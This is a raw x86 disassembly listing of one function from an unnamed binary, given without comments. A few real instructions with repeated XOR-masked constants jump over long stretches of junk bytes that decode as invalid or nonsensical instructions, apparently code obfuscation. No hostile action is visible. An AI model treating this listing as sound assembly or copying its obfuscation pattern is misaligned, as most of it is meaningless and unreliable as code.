  40c054:	outs   dx,DWORD PTR ds:[esi]
  40c055:	cdq    
  40c056:	mov    ds:0x8b70a2ef,al
  40c05b:	mov    ah,0xa7
  40c05d:	sbb    edi,ebx
  40c05f:	inc    ecx
  40c060:	or     ch,ch
  40c062:	sub    ebp,ebx
  40c064:	ins    DWORD PTR es:[edi],dx
  40c065:	fs hlt 
  40c067:	mov    ch,0xe5
  40c069:	dec    ecx
  40c06a:	repz fst DWORD PTR [eax+0x4d0258c1]
  40c071:	pop    esi
  40c072:	pusha  
  40c073:	xchg   esp,eax
  40c074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c075:	adc    BYTE PTR es:[ebx+0x3f],bh
  40c079:	cmp    esi,DWORD PTR [edi]
  40c07b:	jb     0x40c022
  40c07d:	mov    ch,0x2b
  40c07f:	and    DWORD PTR [ecx],eax
  40c081:	mov    ecx,0x7510859
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	inc    esi
  40c0e1:	or     eax,0x35e160e8
  40c0e6:	jle    0x40c166
  40c0e8:	mov    dh,0x7e
  40c0ea:	jle    0x40c16a
  40c0ec:	mov    dl,0xdc
  40c0ee:	adc    BYTE PTR [ecx+esi*2+0x21d4f03a],bl
  40c0f5:	ja     0x40c11b
  40c0f7:	leave  
  40c0f8:	push   cs
  40c0f9:	xor    dl,bl
  40c0fb:	pop    ebp
  40c0fc:	xlat   BYTE PTR ds:[ebx]
  40c0fd:	fidiv  DWORD PTR [ecx-0x26]
  40c100:	xor    al,0x1d
  40c102:	dec    esi
  40c103:	sar    ebx,cl
  40c105:	out    dx,al
  40c106:	leave  
  40c107:	add    eax,0x3de57b64
  40c10c:	jle    0x40c160
  40c10e:	cmp    al,0x3f
  40c110:	cmp    DWORD PTR [ecx-0x11],esi
  40c113:	or     edi,eax
  40c115:	test   eax,0xdfbe923e
  40c11a:	mov    gs,ebx
  40c11c:	adc    dh,BYTE PTR [edi]
  40c11e:	pop    edx
  40c11f:	xor    al,0x41
  40c121:	leave  
  40c122:	(bad)  
  40c123:	out    dx,eax
  40c124:	xchg   esi,eax
  40c125:	(bad)  
  40c126:	mov    DWORD PTR [edx-0x62d87a4],0x783b94a6
  40c130:	arpl   WORD PTR [ecx+edx*4-0x19],sp
  40c134:	in     al,dx
  40c135:	fstp   QWORD PTR [ebp+esi*2+0x32b20431]
  40c13c:	(bad)
  40c13f:	or     DWORD PTR [ebx-0x2b],eax
  40c142:	add    esp,ebp
  40c144:	ins    BYTE PTR es:[edi],dx
  40c145:	cmp    ah,0x31
  40c148:	mov    bl,0xc2
  40c14a:	add    BYTE PTR [ecx+0x67],bl
  40c14d:	popf   
  40c14e:	ins    DWORD PTR es:[edi],dx
  40c14f:	mov    ecx,DWORD PTR [edi]
  40c151:	ja     0x40c0d7
  40c153:	inc    edx
  40c154:	mov    bl,0x73
  40c156:	in     eax,dx
  40c157:	popa   
  40c158:	push   0xffffffa8
  40c15a:	inc    edi
  40c15b:	mov    eax,ds:0x10601d81
  40c160:	clc    
  40c161:	mov    ah,0xff
  40c163:	je     0x40c141
  40c165:	ds vprotb ymm4,xmm7,0x64
  40c16b:	ins    BYTE PTR es:[edi],dx
  40c16c:	add    BYTE PTR [ecx+0xb],dl
  40c16f:	pop    edi
  40c170:	adc    bh,BYTE PTR [edi+0x7c5a96e3]
  40c176:	push   es
  40c177:	jmp    0x94000cf7
  40c17c:	adc    BYTE PTR [ebx+0x7eed9248],bl
  40c182:	pop    ebp
  40c183:	fldln2 
  40c185:	pop    ebx
  40c186:	jnp    0x40c1b7
  40c188:	xor    ebp,edx
  40c18a:	ins    BYTE PTR es:[edi],dx
  40c18b:	or     al,0xca
  40c18d:	pushf  
  40c18e:	pop    edi
  40c18f:	ins    BYTE PTR es:[edi],dx
  40c190:	mov    ecx,0xec9e7399
  40c195:	cld    
  40c196:	je     0x40c1ad
  40c198:	ds jl  0x40c1df
  40c19b:	dec    ecx
  40c19c:	scas   eax,DWORD PTR es:[edi]
  40c19d:	jmp    0x40c173
  40c19f:	mov    ah,0x9e
  40c1a1:	xchg   edx,eax
  40c1a2:	imul   eax,edi,0xffffff94
  40c1a5:	lahf   
  40c1a6:	add    BYTE PTR [esi],bh
  40c1a8:	js     0x40c134
  40c1aa:	pop    eax
  40c1ab:	leave  
  40c1ac:	jne    0x40c15f
  40c1ae:	enter  0x50e7,0x4a
  40c1b2:	sub    cl,BYTE PTR [ecx-0x60f57373]
  40c1b8:	jb     0x40c1ec
  40c1ba:	add    BYTE PTR [ebx],bh
  40c1bc:	enter  0x850f,0xcc
  40c1c0:	std    
  40c1c1:	(bad)  
  40c1c2:	dec    DWORD PTR [ebx+0xeae9de]
  40c1c8:	add    BYTE PTR [eax],al
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx-0x5bdda5e4]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	scas   eax,DWORD PTR es:[edi]
  40c1ed:	cld    
  40c1ee:	sub    eax,0xebe3bf35
  40c1f3:	scas   eax,DWORD PTR es:[edi]
  40c1f4:	xchg   esi,eax
  40c1f5:	test   eax,0x5c8152e3
  40c1fa:	outs   dx,BYTE PTR ds:[esi]
  40c1fb:	jp     0x40c1e3
  40c1fd:	aad    0x6f
  40c1ff:	dec    edx
  40c200:	mov    al,0x5d
  40c202:	jne    0x40c268
  40c204:	call   0x34c740ce
  40c209:	pop    eax
  40c20a:	mov    eax,0x54ce98e3
  40c20f:	and    BYTE PTR [ebp-0x1944bd80],ah
  40c215:	mov    ebp,0x373d39f1
  40c21a:	(bad)  
  40c21b:	fisubr DWORD PTR [ecx+edi*1-0x1929376c]
  40c222:	mov    ds:0xc83314fe,al
  40c227:	test   eax,0x64da2402
  40c22c:	shr    BYTE PTR [esi+0x39faf216],0xe1
  40c233:	in     al,0x16
  40c235:	push   ss
  40c236:	scas   al,BYTE PTR es:[edi]
  40c237:	add    al,0xde
  40c239:	pop    edx
  40c23a:	jno    0x40c1f8
  40c23c:	aas    
  40c23d:	or     edi,eax
  40c23f:	mov    al,0x46
  40c241:	outs   dx,DWORD PTR ds:[esi]
  40c242:	jl     0x40c24c
  40c244:	pop    esp
  40c245:	rol    BYTE PTR [edx],0xfe
  40c248:	leave  
  40c249:	vmptrld QWORD PTR [ebp+0x5e]
  40c24d:	cmp    esp,DWORD PTR ds:0xf998b0f2
  40c253:	xchg   esp,eax
  40c254:	(bad)  
  40c256:	mov    esi,0x15f68f7c
  40c25b:	ss in  al,0x40
  40c25e:	adc    eax,0x79a1d64b
  40c263:	pop    ecx
  40c264:	lock pop edx
  40c266:	scas   eax,DWORD PTR es:[edi]
  40c267:	loop   0x40c243
  40c269:	xlat   BYTE PTR ds:[ebx]
  40c26a:	cmp    dh,dh
  40c26c:	and    cl,BYTE PTR [ecx]
  40c26e:	psrlq  mm4,QWORD PTR [esp+eax*1]
  40c272:	js     0x40c28a
  40c274:	pop    edi
  40c275:	es mov ebp,0xee2f70a9
  40c27b:	ret    
  40c27c:	out    0x9e,eax
  40c27e:	das    
  40c27f:	lahf   
  40c280:	inc    edi
  40c281:	cld    
  40c282:	xor    BYTE PTR [ebx],ch
  40c284:	loop   0x40c278
  40c286:	push   ebx
  40c287:	es jnp 0x40c2df
  40c28a:	sub    BYTE PTR [ecx+0x3f],dl
  40c28d:	dec    ebp
  40c28e:	add    eax,0x279e4933
  40c293:	mov    bh,BYTE PTR [edi+0x657ff2e5]
  40c299:	mov    ah,0x9e
  40c29b:	les    ecx,FWORD PTR [esi]
  40c29d:	outs   dx,BYTE PTR ds:[esi]
  40c29e:	adc    bl,BYTE PTR [ecx]
  40c2a0:	sub    al,0x5a
  40c2a2:	xchg   esi,eax
  40c2a3:	lods   eax,DWORD PTR ds:[esi]
  40c2a4:	dec    edi
  40c2a5:	inc    ebx
  40c2a6:	push   cs
  40c2a7:	repz dec ebx
  40c2a9:	dec    ebx
  40c2aa:	adc    DWORD PTR [ecx],edi
  40c2ac:	mov    al,ds:0x1d4e6ffc
  40c2b1:	pushf  
  40c2b2:	and    eax,0xfc458ba4
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	int3   
  40c2da:	das    
  40c2db:	int3   
  40c2dc:	adc    eax,0x7e7ecb71
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	imul   esp,ecx,0x25
  40c2e8:	pop    ecx
  40c2e9:	aas    
  40c2ea:	ret    0xdb06
  40c2ed:	pop    eax
  40c2ee:	dec    BYTE PTR [esi-0x38]
  40c2f1:	or     eax,0x3a194d0b
  40c2f6:	retf   0x990a
  40c2f9:	out    dx,al
  40c2fa:	mov    cl,0x94
  40c2fc:	aas    
  40c2fd:	sub    ebp,DWORD PTR [ebx-0x28]
  40c300:	fldcw  WORD PTR [ecx+0x31bcc16f]
  40c306:	pop    ecx
  40c307:	pop    esi
  40c308:	push   ds
  40c309:	sbb    ecx,DWORD PTR [ebx+esi*4-0x7f53330]
  40c310:	ins    BYTE PTR es:[edi],dx
  40c311:	add    ah,BYTE PTR [eax+0x6fd7ef20]
  40c317:	cli    
  40c318:	imul   ebp,edi,0xf04bc623
  40c31e:	xor    eax,0x398ccea7
  40c323:	xor    eax,0x9bd4ae4
  40c328:	mov    eax,0x777e53c7
  40c32d:	fdecstp 
  40c32f:	add    DWORD PTR [eax+0x77bc91a6],ecx
  40c335:	in     eax,0x63
  40c337:	mov    ah,0xaf
  40c339:	mov    edx,0x5888141d
  40c33e:	das    
  40c33f:	mov    eax,ds:0x562d108c
  40c344:	arpl   WORD PTR [ecx+ebp*2+0x2e642489],bp
  40c34b:	cmc    
  40c34c:	push   es
  40c34d:	iret   
  40c34e:	sti    
  40c34f:	adc    DWORD PTR [eax-0x6b],0xffffffd4
  40c353:	and    BYTE PTR [eax+0x6e],ah
  40c356:	fisub  DWORD PTR [ebp-0x9397b4f]
  40c35c:	xor    dl,al
  40c35e:	inc    eax
  40c35f:	test   ecx,0x3f2073cf
  40c365:	xchg   ecx,eax
  40c366:	fsubr  QWORD PTR [esi-0x80]
  40c369:	ins    BYTE PTR es:[edi],dx
  40c36a:	sub    al,0xd9
  40c36c:	jge    0x40c3ec
  40c36e:	scas   eax,DWORD PTR es:[edi]
  40c36f:	mov    eax,0x5172e8a4
  40c374:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c376:	scas   al,BYTE PTR es:[edi]
  40c377:	cli    
  40c378:	jmp    0xf8655df2
  40c37d:	pop    es
  40c37e:	dec    ecx
  40c37f:	pop    esi
  40c380:	jmp    0x40c35e
  40c382:	repz mov al,ds:0x96b72fb5
  40c388:	pop    esp
  40c389:	xchg   esp,eax
  40c38a:	mov    dl,0xb9
  40c38c:	sbb    dl,bh
  40c38e:	shl    BYTE PTR [edi],cl
  40c390:	hlt    
  40c391:	nop
  40c392:	lock stos DWORD PTR es:[edi],eax
  40c394:	rcl    edi,cl
  40c396:	(bad)  [edx-0x43469d36]
  40c39c:	sub    eax,DWORD PTR [edi-0x5d]
  40c39f:	pushf  
  40c3a0:	push   cs
  40c3a1:	dec    edx
  40c3a2:	push   ebx
  40c3a3:	sbb    bl,BYTE PTR [ecx-0x12cdedf]
  40c3a9:	imul   edi,esi,0xd3ffe81e
  40c3af:	xor    ebx,ebx
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x8b2e5fee,ecx
  40c3c3:	shl    BYTE PTR [edx],0xd9
  40c3c6:	dec    ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	cmp    ah,BYTE PTR [esi-0x6a03c4a3]
  40c3d4:	mov    esi,0xb38b4caf
  40c3d9:	inc    ecx
  40c3da:	xchg   ecx,eax
  40c3db:	test   al,0x27
  40c3dd:	jno    0x40c457
  40c3df:	mov    cl,BYTE PTR [edx+0x2d58a3f9]
  40c3e5:	mul    DWORD PTR [esi]
  40c3e7:	push   ss
  40c3e8:	lahf   
  40c3e9:	adc    al,BYTE PTR [edx]
  40c3eb:	mov    dl,0xf4
  40c3ed:	or     al,0xa6
  40c3ef:	sub    bl,BYTE PTR [eax-0x51]
  40c3f2:	add    al,0xb
  40c3f4:	sub    eax,0x89793b8d
  40c3f9:	xor    al,BYTE PTR [ecx+0x17]
  40c3fc:	adc    al,0x25
  40c3fe:	add    BYTE PTR [edi-0x6a642217],0x63
  40c405:	xlat   BYTE PTR ds:[ebx]
  40c406:	(bad)  [edx]
  40c408:	aam    0x65
  40c40a:	mov    cl,0xf8
  40c40c:	jmp    0x40c48b
  40c40e:	mov    ecx,0x8725ef1
  40c413:	fldenv [edx+eiz*2-0x40]
  40c417:	adc    ebx,edi
  40c419:	push   0x62
  40c41b:	jno    0x40c495
  40c41d:	xor    dl,ch
  40c41f:	jo     0x40c3b5
  40c421:	mov    ds:0x8ff17a95,eax
  40c426:	arpl   WORD PTR [eax-0x64e14a08],si
  40c42c:	pusha  
  40c42d:	mov    edx,?
  40c42f:	cmp    bh,dl
  40c431:	adc    edi,eax
  40c433:	adc    al,0x66
  40c435:	(bad)  
  40c437:	nop
  40c438:	jne    0x40c497
  40c43a:	(bad)  
  40c43b:	pop    eax
  40c43c:	(bad)  
  40c43e:	gs xchg ebx,eax
  40c440:	enter  0x35fe,0x1d
  40c444:	scas   al,BYTE PTR es:[edi]
  40c445:	push   edi
  40c446:	icebp  
  40c447:	stos   DWORD PTR es:[edi],eax
  40c448:	xchg   esp,eax
  40c449:	xchg   edi,eax
  40c44a:	mov    dh,0x3e
  40c44c:	sub    al,0x3d
  40c44e:	xchg   edx,eax
  40c44f:	and    eax,0x9a45221b
  40c454:	dec    edx
  40c455:	aad    0x4e
  40c457:	jbe    0x40c469
  40c459:	jl     0x40c4d1
  40c45b:	inc    ebx
  40c45c:	enter  0xaedc,0xd8
  40c460:	mov    ebx,0x88abc391
  40c465:	jo     0x40c480
  40c467:	fldcw  WORD PTR [ebx]
  40c469:	push   cs
  40c46a:	(bad)  
  40c46b:	xor    BYTE PTR [edx+0x772ed4fe],cl
  40c471:	fdivr  DWORD PTR [edx-0x43dbf309]
  40c477:	push   ss
  40c478:	jo     0x40c42f
  40c47a:	and    eax,0xeca35a28
  40c47f:	and    BYTE PTR [esi-0x2f13b8b4],bl
  40c485:	dec    ebx
  40c486:	test   DWORD PTR [ecx-0x1f0d9941],esp
  40c48c:	mov    al,0xd5
  40c48e:	enter  0xba16,0xcb
  40c492:	sbb    eax,0x43212eb7
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	cmp    BYTE PTR gs:[edi-0x377e999d],al
  40c4b1:	jle    0x40c531
  40c4b3:	mov    dh,0x7e
  40c4b5:	jle    0x40c535
  40c4b7:	ins    DWORD PTR es:[edi],dx
  40c4b8:	fwait
  40c4b9:	xchg   ecx,eax
  40c4ba:	xor    eax,0x69c393fa
  40c4bf:	stos   DWORD PTR es:[edi],eax
  40c4c0:	xor    al,0xc5
  40c4c2:	pop    edi
  40c4c3:	shl    BYTE PTR [edx-0x3046cf0a],cl
  40c4c9:	(bad)  
  40c4ca:	pop    esp
  40c4cb:	scas   al,BYTE PTR es:[edi]
  40c4cc:	mov    ah,0x88
  40c4ce:	xor    BYTE PTR [edi-0x160d0d19],ah
  40c4d4:	out    0x5c,eax
  40c4d6:	ja     0x40c4a2
  40c4d8:	inc    eax
  40c4d9:	jmp    0x8f51:0xe834df1f
  40c4e0:	mov    ebx,0xb31009eb
  40c4e5:	aaa    
  40c4e6:	inc    esp
  40c4e7:	sbb    DWORD PTR [ebx+0x58bac9ac],esp
  40c4ed:	pop    edi
  40c4ee:	sub    al,0x3f
  40c4f0:	bnd ja 0x40c566
  40c4f3:	pop    edi
  40c4f4:	mov    al,ds:0x5dc57f20
  40c4f9:	jecxz  0x40c52e
  40c4fb:	add    al,0x4c
  40c4fd:	add    ebx,DWORD PTR [edi+0x1a]
  40c500:	push   cs
  40c501:	(bad)  
  40c502:	add    eax,0x3a4d1b7b
  40c507:	aad    0x1e
  40c509:	adc    DWORD PTR [eax+0x5f469423],ebx
  40c50f:	jmp    0x812d:0xb13dd521
  40c516:	test   ebx,ebp
  40c518:	mov    bh,0xd3
  40c51a:	push   ebp
  40c51b:	lea    edx,[eax-0x2752c0f0]
  40c521:	stos   DWORD PTR es:[edi],eax
  40c522:	sti    
  40c523:	cld    
  40c524:	imul   esi,DWORD PTR [ebp-0x49ec87e2],0x67949ff0
  40c52e:	imul   ebx,ecx,0xffffffe0
  40c531:	sbb    al,0x4a
  40c533:	idiv   esp
  40c535:	add    BYTE PTR [eax-0x76],ch
  40c538:	pop    ecx
  40c539:	sub    eax,0xb5ec6333
  40c53e:	mov    esi,0xbeaa7f6d
  40c543:	lods   eax,DWORD PTR ds:[esi]
  40c544:	or     BYTE PTR [ebp-0x4d9bf0c6],dh
  40c54a:	ror    DWORD PTR [ebx-0x2f],cl
  40c54d:	add    ah,BYTE PTR [ecx+0x45]
  40c550:	std    
  40c551:	lods   eax,DWORD PTR ds:[esi]
  40c552:	adc    dl,BYTE PTR [edi]
  40c554:	jns    0x40c52a
  40c556:	hlt    
  40c557:	mov    bh,0xb5
  40c559:	sbb    ecx,DWORD PTR [eax+0x4a]
  40c55c:	pop    ecx
  40c55d:	int    0xe3
  40c55f:	in     eax,dx
  40c560:	pop    esp
  40c561:	lahf   
  40c562:	loope  0x40c5e1
  40c564:	aad    0xf
  40c566:	sbb    al,0x98
  40c568:	jnp    0x40c59f
  40c56a:	inc    esi
  40c56b:	in     eax,dx
  40c56c:	ret    
  40c56d:	push   esp
  40c56e:	sub    esi,0x27
  40c571:	sbb    BYTE PTR [ebx+0x20cc3883],cl
  40c577:	xchg   DWORD PTR [eax-0x4e],ebp
  40c57a:	sbb    edi,esi
  40c57c:	cli    
  40c57d:	dec    esi
  40c57e:	push   esp
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0x26245b34
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	inc    esi
  40c5b1:	or     DWORD PTR [edx],ecx
  40c5b3:	jle    0x40c58c
  40c5b5:	cs add al,0xbd
  40c5b8:	cmp    DWORD PTR [ebp*4+0x3174ad61],ecx
  40c5bf:	sbb    bh,BYTE PTR [ecx+ebx*4]
  40c5c2:	xchg   cl,bh
  40c5c4:	cld    
  40c5c5:	or     DWORD PTR [eax-0x32],edx
  40c5c8:	sub    cl,BYTE PTR [edx-0x7c598b84]
  40c5ce:	cld    
  40c5cf:	xchg   edx,eax
  40c5d0:	test   BYTE PTR [eax+0x51552d56],ch
  40c5d6:	in     al,0x73
  40c5d8:	xor    BYTE PTR [ecx],bl
  40c5da:	mov    ds:0x8bd8aa9a,eax
  40c5df:	jmp    0x9825:0xa9689410
  40c5e6:	xchg   esi,eax
  40c5e8:	xchg   ebp,eax
  40c5e9:	mov    ds:0x3879e140,eax
  40c5ee:	add    eax,0xd6b1b0c3
  40c5f3:	sub    DWORD PTR [edx-0x27501ec5],ebp
  40c5f9:	or     ebp,ebx
  40c5fb:	and    cl,BYTE PTR [eax+esi*1-0x60346e52]
  40c602:	or     BYTE PTR [ecx],dl
  40c604:	adc    ecx,DWORD PTR [edx-0x3b825bf4]
  40c60a:	dec    edx
  40c60b:	loop   0x40c630
  40c60d:	aaa    
  40c60e:	aam    0x4
  40c610:	xchg   ecx,eax
  40c611:	cwde   
  40c612:	sbb    DWORD PTR [ebx+0x6d71e0b2],eax
  40c618:	fadd   QWORD PTR [ecx+ebx*2+0x67]
  40c61c:	cmp    ebx,ebx
  40c61e:	push   0x74
  40c620:	inc    edx
  40c621:	dec    edi
  40c622:	mov    ds:0x76e83ab1,eax
  40c627:	pusha  
  40c628:	in     eax,0xb1
  40c62a:	jge    0x40c647
  40c62c:	iret   
  40c62d:	dec    esp
  40c62e:	mov    ds,WORD PTR [eax-0x74]
  40c631:	mov    WORD PTR ds:0x2083ed3d,cs
  40c637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c638:	mov    edx,DWORD PTR [ebp+0x50feef57]
  40c63e:	out    0x4c,eax
  40c640:	push   cs
  40c641:	shr    BYTE PTR [ebp+0x3f],1
  40c644:	jae    0x40c65f
  40c646:	mov    al,0x83
  40c648:	push   ss
  40c649:	das    
  40c64a:	daa    
  40c64b:	imul   ebx,DWORD PTR [eax+0x207c5a6c],0xaf718787
  40c655:	sub    DWORD PTR [edi],esp
  40c657:	sbb    ah,ah
  40c659:	lahf   
  40c65a:	lock mov dl,0xcc
  40c65d:	call   0x852c:0x35624305
  40c664:	mov    esp,0xc00fd244
  40c669:	stos   DWORD PTR es:[edi],eax
  40c66a:	inc    eax
  40c66c:	mov    esp,0x92f23d1f
  40c671:	fadd   DWORD PTR [edi]
  40c673:	or     ch,ah
  40c675:	and    esp,DWORD PTR [edi+0x458b4920]
  40c67b:	in     al,0xf
  40c67d:	scas   eax,DWORD PTR es:[edi]
  40c67e:	rol    DWORD PTR [ebx],0xe0
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
